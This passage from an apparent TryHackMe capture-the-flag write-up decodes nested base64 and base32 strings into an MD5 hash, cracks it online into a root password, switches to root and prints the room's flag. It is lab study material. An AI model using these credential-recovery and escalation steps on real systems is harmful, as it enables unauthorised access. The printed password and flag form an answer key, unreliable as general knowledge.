QkdYVVJUTEpaS0ZTU1lLCg==" | base64 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

Decoded it further with base32.

```
echo "LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK" | base32 -d
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
```

Decoded it once more and received an MD5 Hash.

```
echo "YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK" | base64 -d
a00a12aad6b7c16bf07032bd05a31d56
```

Cracked it with crackstation.

```
flintstonesvitamins
```

Logged into user "root".

```
su root
flintstonesvitamins
```

Retrieved root.txt in /root directory.

```
THM{de4043c009214b56279982bf10a661b7}
```
